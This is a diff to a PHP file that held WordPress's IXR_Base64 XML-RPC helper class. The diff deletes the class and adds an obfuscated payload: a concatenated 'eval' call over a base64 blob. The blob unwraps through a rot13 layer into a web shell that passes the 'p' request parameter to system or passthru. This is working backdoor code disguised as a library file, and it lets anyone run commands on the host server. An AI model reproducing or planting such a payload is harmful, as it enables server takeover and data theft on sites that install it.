@@ -1,42 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * IXR_Base64
- *
- * @package IXR
- * @since 1.5.0
- */
-class IXR_Base64
-{
-    var $data;
-
-	/**
-	 * PHP5 constructor.
-	 */
-    function __construct( $data )
-    {
-        $this->data = $data;
-    }
-
-	/**
-	 * PHP4 constructor.
-	 */
-	public function IXR_Base64( $data ) {
-		self::__construct( $data );
-	}
-
-    function getXml()
-    {
-        return '<base64>'.base64_encode($this->data).'</base64>';
-    }
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIFZLRV9PbmZyNjQKICoKICogQGNucHhudHIgVktFCiAqIEBmdmFwciAxLjUuMAogKi8KcHluZmYgVktFX09uZnI2NAp7CiAgICBpbmUgJHFuZ247CgoJLyoqCgkgKiBDVUM1IHBiYWZnZWhwZ2JlLgoJICovCiAgICBzaGFwZ3ZiYSBfX3BiYWZnZWhwZyggJHFuZ24gKQogICAgewogICAgICAgICRndXZmLT5xbmduID0gJHFuZ247CiAgICB9CgoJLyoqCgkgKiBDVUM0IHBiYWZnZWhwZ2JlLgoJICovCgljaG95dnAgc2hhcGd2YmEgVktFX09uZnI2NCggJHFuZ24gKSB7CgkJZnJ5czo6X19wYmFmZ2VocGcoICRxbmduICk7Cgl9CgogICAgc2hhcGd2YmEgdHJnS3p5KCkKICAgIHsKICAgICAgICBlcmdoZWEgJzxvbmZyNjQ+Jy5vbmZyNjRfcmFwYnFyKCRndXZmLT5xbmduKS4nPC9vbmZyNjQ+JzsKICAgIH0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
